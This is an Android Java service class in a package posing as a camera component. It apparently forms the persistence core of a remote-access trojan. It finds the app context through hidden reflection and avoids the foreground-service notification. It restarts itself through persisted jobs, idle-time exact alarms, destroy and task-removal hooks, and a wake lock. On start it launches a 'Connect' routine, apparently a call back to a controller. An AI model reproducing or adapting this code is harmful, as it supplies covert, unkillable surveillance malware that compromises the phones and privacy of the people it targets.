package com.android.photo.camera.capture;

import android.app.AlarmManager;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;

import java.lang.reflect.Method;

public class MainService extends Service {
    private static Context contextOfApplication;
    private PowerManager.WakeLock wakeLock;
    private static final int JOB_ID = 1000;
    private static final long RESTART_INTERVAL = 60 * 1000; // 1 minute

    private static void findContext() throws Exception {
        Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
        final Context appContext = (Context) currentApplication.invoke(null, (Object[]) null);

        if (appContext == null) {
            final Handler handler = new Handler(Looper.getMainLooper());
            handler.post(() -> {
                try {
                    Context foundContext = (Context) currentApplication.invoke(null, (Object[]) null);
                    if (foundContext != null) {
                        startService(foundContext);
                    }
                } catch (Exception ignored) {}
            });
        } else {
            startService(appContext);
        }
    }

    public static void start() {
        try {
            findContext();
        } catch (Exception ignored) {}
    }

    public static void startService(Context ctx) {
        // Changed from startForegroundService to startService
        Intent serviceIntent = new Intent(ctx, MainService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startService(serviceIntent);
        } else {
            ctx.startService(serviceIntent);
        }
        scheduleJob(ctx);
        scheduleAlarm(ctx);
    }

    private static void scheduleJob(Context context) {
        ComponentName serviceComponent = new ComponentName(context, MainService.class);
        JobInfo.Builder builder = new JobInfo.Builder(JOB_ID, serviceComponent);
        builder.setPeriodic(15 * 60 * 1000)
                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                .setPersisted(true)
                .setRequiresCharging(false)
                .setRequiresDeviceIdle(false);

        JobScheduler scheduler = (JobScheduler) context.getSystemService(Context.JOB_SCHEDULER_SERVICE);
        if (scheduler != null) {
            scheduler.schedule(builder.build());
        }
    }

    private static void scheduleAlarm(Context context) {
        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(context, MainService.class);
        PendingIntent pendingIntent = PendingIntent.getService(
                context,
                1001,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        if (alarmManager != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + RESTART_INTERVAL,
                        pendingIntent
                );
            } else {
                alarmManager.setExact(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + RESTART_INTERVAL,
                        pendingIntent
                );
            }
        }
    }

    private void acquireWakeLock() {
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (powerManager != null) {
            wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "MainService::WakeLockTag"
            );
            wakeLock.acquire(10*60*1000L); // 10 minutes timeout
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
        contextOfApplication = this;
        acquireWakeLock();
        Connect.startAsync(this);
        scheduleAlarm(this);
        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        Intent broadcastIntent = new Intent("RestartService");
        sendBroadcast(broadcastIntent);
        scheduleAlarm(this);
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        scheduleJob(this);
        scheduleAlarm(this);

        // Immediate restart
        Intent restartIntent = new Intent(getApplicationContext(), MainService.class);
        PendingIntent service = PendingIntent.getService(
                getApplicationContext(),
                1001,
                restartIntent,
                PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
        );

        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (alarmManager != null) {
            alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, 1000, service);
        }
    }

    public static Context getContextOfApplication() {
        return contextOfApplication;
    }
}